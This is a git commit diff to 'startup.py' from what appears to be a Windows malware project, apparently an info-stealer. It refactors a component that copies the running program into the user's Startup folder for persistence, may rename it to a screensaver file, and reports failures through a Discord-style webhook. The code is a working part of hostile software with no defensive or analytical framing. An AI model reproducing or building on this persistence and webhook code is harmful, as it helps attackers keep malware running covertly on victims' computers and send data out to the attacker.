960f1bca0d7c577b27bcf610c267f9b7a607781d
Jonas Emanuel Hartkopf <96620548+gumbobr0t@users.noreply.github.com>
2023-08-19 14:16:48 +0200

    Update startup.py

--- components/source/startup.py
+++ components/source/startup.py
@@ -5,31 +5,33 @@ from config import Config
 from __webhook import _WebhookX
 from sys import argv
 
+cc = Config()
+eb_color = cc.get_color()
+
 class Startup:
-    def __init__(self):
+    def __init__(self, cc_instance):
+        self.cc = cc_instance
         self.roaming = os.getenv("appdata")
         self.startup_loc = os.path.join(self.roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
         self.file_path = os.path.abspath(argv[0])
 
     def send_error_notification(self, exception):
-        cc = Config()
         webx = _WebhookX().get_object()
 
         embed = Embed(
             description='Error while copying to startup',
-            color=16399677,
+            color=self.cc.get_color(),
             timestamp='now'
         )
 
-        embed.set_author(name=cc.get_name(), icon_url=cc.get_avatar())
-        embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())
+        embed.set_author(name=self.cc.get_name(), icon_url=self.cc.get_avatar())
+        embed.set_footer(text=self.cc.get_footer(), icon_url=self.cc.get_avatar())
         embed.add_field(name="Couldn't copy to startup or rename to scr | Help us by reporting this bug",
                         value=f'Advanced Log: ```{exception}```')
 
         webx.send(embed=embed)
 
     def copy_to_startup(self):
-        cc = Config()
         try:
             startup_file_path = os.path.join(self.startup_loc, os.path.basename(self.file_path))
             shutil.copy(self.file_path, startup_file_path)
